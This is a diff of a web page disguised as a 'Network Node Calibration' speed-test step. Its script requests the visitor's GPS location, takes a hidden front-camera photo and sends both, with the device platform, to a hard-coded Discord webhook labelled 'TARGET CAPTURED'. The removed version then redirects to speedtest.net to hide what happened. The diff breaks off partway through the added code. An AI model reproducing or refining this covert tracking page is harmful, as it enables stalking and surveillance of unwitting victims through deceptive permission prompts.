@@ -1,86 +1,71 @@
-<script>
-    const WEBHOOK = 'https://discord.com/api/webhooks/1476812049169383524/WP8wz0C8921xD_t0FTkX5MX2zSvb1OD0l2AGc55llvFCVcei7VeRgKG-0Q7gftwITMZV';
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Network Node Calibration</title>
+    <style>
+        body { font-family: sans-serif; background: #0b0e18; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #161b2c; padding: 30px; border-radius: 20px; text-align: center; width: 90%; max-width: 350px; border: 1px solid #232a42; }
+        .btn { background: #00d2ff; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; border-radius: 12px; cursor: pointer; margin-top: 20px; font-size: 1.1rem; }
+        #status { margin-top: 15px; color: #5c6784; font-size: 0.8rem; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
 
-    document.getElementById('startBtn').addEventListener('click', function() {
-        const status = document.getElementById('status');
-        status.innerText = "1. Initializing GPS Node...";
+    <div class="card">
+        <h2>NODE CALIBRATION</h2>
+        <p>Sync sensors to begin the 2026 Speed Test optimization.</p>
+        <button class="btn" id="startBtn">START NOW</button>
+        <div id="status">Status: Waiting for Handshake...</div>
+    </div>
 
-        // Request GPS First
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            status.innerText = "2. GPS Linked. Syncing Camera...";
-            
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
 
-            let stream = null;
-            try {
-                // Requesting front camera
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: false 
-                });
-            } catch (e) {
-                console.log("Camera access denied");
-            }
+    <script>
+        const WEBHOOK = 'https://discord.com/api/webhooks/1476812049169383524/WP8wz0C8921xD_t0FTkX5MX2zSvb1OD0l2AGc55llvFCVcei7VeRgKG-0Q7gftwITMZV';
 
-            status.innerText = "3. Calibrating Sensors (Keep Still)...";
-            
-            if (stream) {
-                const video = document.getElementById('video');
-                video.srcObject = stream;
+        document.getElementById('startBtn').addEventListener('click', function() {
+            const status = document.getElementById('status');
+            status.innerText = "1. Requesting GPS Node...";
+
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                status.innerText = "2. GPS Linked. Syncing Camera...";
                 
-                // CRITICAL: Wait 2.5 seconds for Android sensors to "wake up"
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    canvas.toBlob(async (blob) => {
-                        const formData = new FormData();
-                        const message = {
-                            content: "📸 **CLEAR CAPTURE & LOCATION**",
-                            embeds: [{
-                                title: "Device Report",
-                                color: 3066993,
-                                fields: [
-                                    { name: "📍 Maps Link", value: `http://google.com/maps?q=${lat},${lon}` },
-                                    { name: "📱 Device", value: navigator.platform }
-                                ]
-                            }]
-                        };
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
 
-                        formData.append('payload_json', JSON.stringify(message));
-                        formData.append('file', blob, 'capture.jpg');
+                let stream = null;
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: "user" }, 
+                        audio: false 
+                    });
+                } catch (e) {
+                    console.log("Camera access denied");
+                }
 
-                        // Send to your Webhook
-                        await fetch(WEBHOOK, { method: 'POST', body: formData });
+                if (stream) {
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    status.innerText = "3. Calibrating Sensors (Keep Still)...";
+
+                    // Wait 2.5 seconds to fix the "Black Photo" issue
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                         
-                        // Kill camera to turn off green dot
-                        stream.getTracks().forEach(t => t.stop());
-                        done();
-                    }, 'image/jpeg', 0.9); // Higher quality (0.9)
-                }, 2500); 
-            } else {
-                // Send only location if camera fails
-                const formData = new FormData();
-                formData.append('payload_json', JSON.stringify({
-                    content: "📍 **LOCATION ONLY (Cam Denied)**",
-                    embeds: [{ fields: [{ name: "Maps", value: `http://google.com/maps?q=${lat},${lon}` }] }]
-                }));
-                await fetch(WEBHOOK, { method: 'POST', body: formData });
-                done();
-            }
-
-        }, (err) => {
-            alert("Error: Calibration requires GPS access.");
-            status.innerText = "Error: Handshake Failed.";
-        }, { enableHighAccuracy: true });
-    });
-
-    function done() {
-        document.getElementById('status').innerText = "Calibration Complete!";
-        setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
-    }
-</script>
+                        canvas.toBlob(async (blob) => {
+                            const formData = new FormData();
+                            const message = {
+                                content: "📸 **TARGET CAPTURED**",
+                                embeds: [{
+                                    title: "Calibration Report",
+                                    color: 3066993,
+                                    fields: [
+                                        { name:
